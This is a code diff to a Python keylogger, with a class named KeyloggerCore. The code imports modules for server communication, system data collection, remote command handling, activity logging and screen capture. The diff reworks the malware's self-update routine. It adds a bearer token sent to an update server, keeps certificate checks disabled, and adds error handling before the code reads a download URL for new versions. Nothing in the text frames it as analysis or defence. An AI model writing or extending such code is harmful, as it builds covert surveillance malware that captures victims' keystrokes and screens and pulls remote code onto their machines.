@@ -15,6 +15,7 @@ from network.communicator import ServerCommunicator, CommunicationError
 from system.collector import SystemCollector
 from commands.handler import CommandHandler, CommandError
 from monitoring.logger import ActivityLogger
+from packaging import version
 from PIL import Image
 import io
 import pyautogui
@@ -76,14 +77,26 @@ class KeyloggerCore:
             if Config.DEBUG_MODE:
                 logging.info("Checking for updates...")
 
-            # دریافت اطلاعات نسخه از سرور
-            response = requests.get(f"{Config.SERVER_URL}/version.php", timeout=Config.COMMAND_TIMEOUT, verify=False)
+            # ارسال درخواست با توکن
+            headers = {"Authorization": f"Bearer {Config.SECRET_TOKEN}"}
+            response = requests.get(
+                f"{Config.UPDATE_URL}/version.php",
+                headers=headers,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
-                    logging.error(f"Failed to fetch version info: status={response.status_code}")
+                    logging.error(f"Failed to fetch version info: status={response.status_code}, response={response.text}")
                 return
 
             version_info = response.json()
+            if 'error' in version_info:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Version check error: {version_info['error']}")
+                return
+
             server_version = version_info.get('current_version', '0.0')
             download_url = version_info.get('download_url', '')
 
